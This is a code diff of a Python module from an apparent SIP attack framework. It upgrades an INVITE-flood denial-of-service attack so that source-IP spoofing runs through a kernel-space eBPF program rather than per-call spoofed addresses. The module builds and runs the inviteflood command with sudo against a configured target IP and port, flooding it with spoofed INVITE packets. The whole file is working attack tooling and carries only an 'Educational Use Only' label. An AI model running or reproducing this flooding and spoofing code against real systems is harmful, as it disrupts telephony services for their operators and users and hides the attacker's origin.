@@ -1,36 +1,35 @@
 """
 eBPF-based InviteFlood Attack Module.
 
-This module implements a high-performance SIP InviteFlood attack with IP spoofing.
-Instead of complex eBPF packet interception, it directly uses different source IPs
-for each inviteflood call, providing better reliability and performance.
+This module implements a high-performance SIP InviteFlood attack with eBPF-based IP spoofing.
+It uses kernel-space packet modification for superior performance compared to userspace approaches.
 """
 
 from pathlib import Path
 from typing import List, Optional, Any
-import ipaddress
 import time
-from utils.core.logs import print_error, print_info, print_warning
+from utils.core.logs import print_error, print_info, print_success
 from utils.interfaces.attack_interface import AttackInterface
 from utils.registry.metadata import ModuleInfo
 from utils.core.command_runner import run_command_str
+from sip_attacks.eBPF.ebpf_sip_spoofing import EbpfSipPacketSpoofer
 
 
 class InviteFloodAttackEbpf(AttackInterface):
     """
     eBPF-based SIP INVITE Flood Attack Module.
     
-    This class implements a SIP INVITE flood attack with IP spoofing capabilities.
-    Instead of using complex eBPF packet interception, it directly specifies different
-    source IP addresses for each inviteflood command, providing better reliability.
+    This class implements a SIP INVITE flood attack with high-performance eBPF-based
+    IP spoofing capabilities. It uses kernel-space packet modification for superior
+    performance compared to userspace approaches.
     """
 
     # Module information for the registry
     infos: ModuleInfo = ModuleInfo(
-        description="eBPF-based SIP INVITE Flood Attack Module using direct IP spoofing",
-        version="1.0.0",
+        description="eBPF-based SIP INVITE Flood Attack Module using kernel-space IP spoofing",
+        version="2.0.0",
         author="StormShadow",
-        requirements=["inviteflood"],
+        requirements=["inviteflood", "tc", "bpftool", "clang"],
         license="Educational Use Only"
     )
 
@@ -76,11 +75,99 @@ class InviteFloodAttackEbpf(AttackInterface):
         # Set dry_run parameter after initialization
         self.dry_run = kwargs.get('dry_run', False)
         
+        # Mark dry run and spoofing as implemented
+        self.dry_run_implemented = True
+        self.spoofing_implemented = True
+        
+        # Initialize eBPF spoofer
+        self.ebpf_spoofer: Optional[EbpfSipPacketSpoofer] = None
+        
         print_info(f"eBPF InviteFlood attack initialized with target: {self.target_ip}:{self.target_port}")
+        print_info(f"eBPF spoofing will use interface: {self.interface}")
+        print_info(f"Spoofing subnet: {self.spoofing_subnet}")
+
+    def start_ebpf_spoofing(self) -> bool:
+        """
+        Start eBPF-based packet spoofing.
+        
+        Returns:
+            bool: True if spoofing started successfully, False otherwise
+        """
+        if self.dry_run:
+            print_info("Dry run mode: would start eBPF spoofing")
+            return True
+        
+        # Check if spoofing is already running
+        if self.ebpf_spoofer is not None:
+            print_info("eBPF spoofing is already running")
+            return True
+            
+        try:
+            self.ebpf_spoofer = EbpfSipPacketSpoofer(
+                attack_queue_num=self.attack_queue_num,
+                spoofed_subnet=self.spoofing_subnet or '10.10.122.0/25',
+                victim_port=self.target_port,
+                victim_ip=self.target_ip,
+                attacker_port=self.source_port,
+                interface=self.interface,
+                open_window=self.open_window,
+                dry_run=self.dry_run
+            )
+            
+            if self.ebpf_spoofer.start_spoofing():
+                print_info("eBPF spoofing started successfully")
+                return True
+            else:
+                print_error("Failed to start eBPF spoofing")
+                return False
+        except Exception as e:
+            print_error(f"Exception starting eBPF spoofing: {e}")
+            return False
+
+    def stop_ebpf_spoofing(self) -> bool:
+        """
+        Stop eBPF-based packet spoofing.
+        
+        Returns:
+            bool: True if spoofing stopped successfully, False otherwise
+        """
+        if self.dry_run:
+            print_info("Dry run mode: would stop eBPF spoofing")
+            return True
+            
+        if self.ebpf_spoofer is not None:
+            try:
+                result = self.ebpf_spoofer.stop_spoofing()
+                self.ebpf_spoofer = None
+                print_info("eBPF spoofing stopped successfully")
+                return result
+            except Exception as e:
+                print_error(f"Exception stopping eBPF spoofing: {e}")
+                return False
+        return True
+
+    def start_spoofing(self) -> bool:
+        """
+        Override base class method to use eBPF spoofing.
+        
+        Returns:
+            bool: True if spoofing started successfully, False otherwise
+        """
+        return self.start_ebpf_spoofing()
+
+    def stop_spoofing(self) -> bool:
+        """
+        Override base class method to use eBPF spoofing.
+        
+        Returns:
+            bool: True if spoofing stopped successfully, False otherwise
+        """
+        return self.stop_ebpf_spoofing()
 
     def cleanup(self) -> None:
         """Clean up attack resources."""
         print_info("Cleaning up eBPF InviteFlood attack resources")
+        self.stop_ebpf_spoofing()
 
     def end(self):
         """End the attack and cleanup."""
@@ -89,69 +176,64 @@ class InviteFloodAttackEbpf(AttackInterface):
         self.cleanup()
 
     def run(self) -> None:
-        """Execute the InviteFlood attack with IP spoofing."""
-        print_info("Running eBPF InviteFlood attack")
+        """Execute the InviteFlood attack with eBPF-based IP spoofing."""
+        print_info("Running eBPF InviteFlood attack with kernel-space packet spoofing")
         
         if self.dry_run:
-            print_info("Dry run mode: would execute inviteflood command with IP spoofing")
+            print_info("Dry run mode: would execute inviteflood with eBPF spoofing")
             print_info(f"Would attack target: {self.target_ip}:{self.target_port}")
-            print_info(f"Would use IP spoofing with subnet: {self.spoofing_subnet}")
+            print_info(f"Would use eBPF spoofing with subnet: {self.spoofing_subnet}")
+            print_info(f"Would use interface: {self.interface}")
             return
             
         try:
-            # Get spoofed IPs from the subnet for direct IP spoofing
-            if not self.spoofing_subnet:
-                print_error("No spoofing subnet configured")
-                return
-            
-            spoofed_ips = list(ipaddress.ip_network(self.spoofing_subnet).hosts())
-            
-            # Send packets from different spoofed IPs 
-            packets_per_ip = max(1, self.max_count // len(spoofed_ips))
-            remaining_packets = self.max_count
-            
-            print_info(f"Spoofing from {len(spoofed_ips)} different IPs in subnet {self.spoofing_subnet}")
-            
-            for i, spoofed_ip in enumerate(spoofed_ips):
-                if remaining_packets <= 0:
-                    break
-                    
-                # Calculate how many packets to send from this IP
-                packets_this_round = min(packets_per_ip, remaining_packets)
-                if i == len(spoofed_ips) - 1:  # Last IP gets any remaining packets
-                    packets_this_round = remaining_packets
+            # Check if eBPF spoofing is already running (started by AttackSession)
+            if self.ebpf_spoofer is None:
+                # Start eBPF spoofing if not already started
+                if not self.start_ebpf_spoofing():
+                    print_error("Failed to start eBPF spoofing, aborting attack")
+                    return
+            else:
+                print_info("eBPF spoofing already active (started by session)")
                 
-                print_info(f"Sending {packets_this_round} packets from {spoofed_ip}")
-                
-                command = (
-                    f"inviteflood "
-                    f"{self.interface} "
-                    f'200 '  # target user
-                    f"{self.target_ip} "  # target domain (using IP)
-                    f"{self.target_ip} "  # IPv4 addr of flood target
-                    f"{packets_this_round} "  # number of packets from this IP
-                    f"-i {spoofed_ip} "  # source IP address (spoofed)
-                    f"-S {self.source_port} "  # source port
-                    f"-D {self.target_port} "  # destination port
-                    f"-s {self.delay} "  # delay between packets
-                )
-                
-                try:
-                    run_command_str(command, want_sudo=True, capture_output=False, check=True)
-                    remaining_packets -= packets_this_round
+            print_info(f"eBPF spoofing active on interface {self.interface}")
+            print_info(f"Packets to {self.target_ip}:{self.target_port} will be spoofed with IPs from {self.spoofing_subnet}")
+            
+            # Wait a moment for eBPF program to be fully loaded
+            time.sleep(0.5)
+            
+            # Now run inviteflood - the eBPF program will automatically spoof the packets
+            print_info(f"Sending {self.max_count} INVITE packets (eBPF will spoof source IPs)")
+            
+            # Build inviteflood command - no need to specify source IP since eBPF handles it
+            command = (
+                f"inviteflood "
+                f"{self.interface} "
+                f"200 "  # target user
+                f"{self.target_ip} "  # target domain (using IP)
+                f"{self.target_ip} "  # IPv4 addr of flood target
+                f"{self.max_count} "  # number of packets
+                f"-S {self.source_port} "  # source port
+                f"-D {self.target_port} "  # destination port
+                f"-s {self.delay} "  # delay between packets
+            )
+            
+            print_info(f"Executing command: {command}")
+            
+            try:
+                # Run inviteflood - eBPF will handle the spoofing
+                run_command_str(command, want_sudo=True, capture_output=False, check=True)
+                print_success(f"Successfully sent {self.max_count} packets with eBPF spoofing")
                     
-                    # Small delay between different source IPs to avoid overwhelming
-                    if remaining_packets > 0:
-                        time.sleep(0.1)
-                        
-                except Exception as e:
-                    print_warning(f"Failed to send packets from {spoofed_ip}: {e}")
-                    continue
-                    
+            except Exception as e:
+                print_error(f"Failed to run inviteflood: {e}")
+                
         except Exception as e:
             print_error(f"Failed to run eBPF InviteFlood attack: {e}")
-            self.cleanup()
-            return
+        finally:
+            # Don't stop spoofing here if it was started by AttackSession
+            # AttackSession will handle stopping it properly
+            pass
 
     def stop(self) -> None:
         """Stop the attack."""
@@ -161,6 +243,7 @@ class InviteFloodAttackEbpf(AttackInterface):
     
     def get_attack_description(self) -> str:
         """Get attack description."""
-        return ("This is an eBPF-based InviteFlood attack module that uses direct IP spoofing. "
-                "It sends SIP INVITE packets from multiple source IP addresses in a specified subnet, "
-                "providing better reliability than complex eBPF packet interception.")
+        return ("This is an eBPF-based InviteFlood attack module that uses high-performance kernel-space "
+                "packet spoofing. It attaches an eBPF program to the network interface that automatically "
+                "modifies SIP INVITE packets with different source IP addresses from a specified subnet, "
+                "providing superior performance compared to userspace approaches.")
